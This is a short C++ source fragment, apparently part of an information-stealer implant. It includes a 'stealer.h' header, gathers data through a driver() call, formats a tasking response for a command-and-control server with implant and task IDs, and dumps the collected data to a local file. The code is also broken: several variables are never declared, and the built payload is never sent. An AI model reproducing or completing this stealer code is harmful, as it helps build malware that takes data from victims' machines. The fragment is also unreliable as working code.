#include "stealer.h"
#include <fstream>


int main(int argc, char* argv[]){
    json a = driver();
    int length = 78 + temp;
    char *postdata = (char*) malloc(length);
    sprintf(postdata, "{\"target_implant_id\":%d,\"task_id\":%d,\"response_data\":\"%s\",\"success\":%s,\"command\":\"%s\"}", implant_id, task_id, results.c_str(), success.c_str(), command.c_str());
    
    std::ofstream file("bas.txt");
    file << a.dump();

}